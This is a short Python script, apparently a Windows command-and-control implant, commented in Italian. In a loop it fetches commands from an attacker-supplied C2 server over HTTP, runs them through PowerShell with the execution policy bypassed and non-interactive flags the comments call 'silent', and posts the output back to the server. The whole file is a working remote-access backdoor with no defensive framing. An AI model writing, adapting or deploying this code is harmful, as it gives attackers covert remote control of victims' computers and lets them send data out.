import requests
import subprocess
import time
import sys

if len(sys.argv) < 2:
    print("Usage: python3 payload_win.py <C2_IP_ADDRESS>")
    sys.exit(1)

server_url     = "http://{}:80".format(sys.argv[1])
check_interval = 5


def execute_command(command: str) -> str:
    """Esegue il comando tramite PowerShell e ritorna l'output."""
    ps_command = [
        "powershell.exe",
        "-NoProfile",           # non carica il profilo utente (più veloce e silenzioso)
        "-NonInteractive",      # blocca qualsiasi prompt interattivo
        "-ExecutionPolicy", "Bypass",   # ignora la policy di esecuzione
        "-Command", command,
    ]
    try:
        result = subprocess.run(
            ps_command,
            capture_output=True,
            timeout=30,
        )
        stdout = result.stdout.decode("utf-8", errors="ignore").strip()
        stderr = result.stderr.decode("utf-8", errors="ignore").strip()

        # Se c'è stderr lo accodiamo all'output così il C2 lo vede comunque
        if stderr:
            return f"{stdout}\n[stderr] {stderr}".strip()
        return stdout
    except subprocess.TimeoutExpired:
        return "[errore] timeout: il comando ha superato i 30 secondi"
    except FileNotFoundError:
        return "[errore] powershell.exe non trovato"
    except Exception as e:
        return f"[errore] {e}"


def main():
    while True:
        try:
            response = requests.get(f"{server_url}/command", timeout=10)
            if response.status_code == 200:
                command = response.text.strip()
                if not command:
                    time.sleep(check_interval)
                    continue
                if command.lower() == "exit":
                    break
                output = execute_command(command)
                requests.post(f"{server_url}/result", data={"output": output})
        except requests.RequestException:
            pass
        time.sleep(check_interval)


if __name__ == "__main__":
    main()